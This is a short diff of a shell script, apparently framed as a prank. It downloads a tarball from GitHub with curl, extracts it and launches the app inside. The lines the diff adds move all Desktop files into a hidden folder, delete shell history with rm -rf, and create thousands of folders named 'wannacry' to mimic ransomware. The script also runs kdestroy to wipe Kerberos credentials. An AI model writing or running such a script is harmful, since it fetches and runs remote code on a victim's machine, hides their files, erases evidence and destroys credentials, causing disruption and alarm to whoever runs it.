@@ -4,6 +4,16 @@ curl -s -L https://github.com/monybigsef/p1/raw/master/prank.tar.gz -o /tmp/laz/
 
 tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null
 
+mkdir ~/.Laz/
+
+mv ~/Desktop/* ~/.Laz/
+
+cd ~/Desktop
+
+rm -rf ~/.*history*
+
+mkdir wannacry{0..10000}
+
 nohup open /tmp/laz/app/Laz.app > /dev/null
 
 kdestroy
